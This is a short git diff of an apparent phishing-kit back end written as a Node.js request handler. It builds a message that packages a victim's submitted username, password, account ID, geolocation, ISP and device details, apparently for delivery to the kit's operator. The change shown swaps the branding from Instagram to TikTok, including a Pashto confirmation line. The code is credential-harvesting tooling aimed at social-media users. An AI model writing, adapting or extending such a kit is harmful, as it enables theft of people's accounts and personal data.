@@ -40,7 +40,7 @@ module.exports = async (req, res) => {
 
   // ✉️ Step 3: Compose message
   const message = `
-╭───🔘 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗗𝗮𝘁𝗮 𝗦𝘂𝗯𝗺𝗶𝘁𝘁𝗲𝗱 ✅ ───╮
+╭───🔘 𝗧𝗶𝗸𝗧𝗼𝗸 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗗𝗮𝘁𝗮 𝗦𝘂𝗯𝗺𝗶𝘁𝘁𝗲𝗱 ✅ ───╮
 ├ 👤 Username: ${username}
 ├ 🔐 Password: ${password}
 ├ 🆔 ID: ${uid}
@@ -51,7 +51,7 @@ module.exports = async (req, res) => {
 ├ 🛰️ ISP: ${geo.isp || 'Unknown'}
 ├ 📱 Device: ${userAgent}
 ╰━━━━━━━━━━━━━━━━━━━━━━╯
-*د انسټا معلومات بریالۍ توګه ترلاسه شول 🔘*
+*د ټوک معلومات بریالۍ توګه ترلاسه شول 🔘*
 
 ╭─────── 🚀 Root Access Panel 💠 ───────╮
 │ 🧑🏻‍💻 𝗕𝘂𝗶𝗹𝘁 𝗕𝘆: 💛 𝗪𝗔𝗖𝗜𝗤 
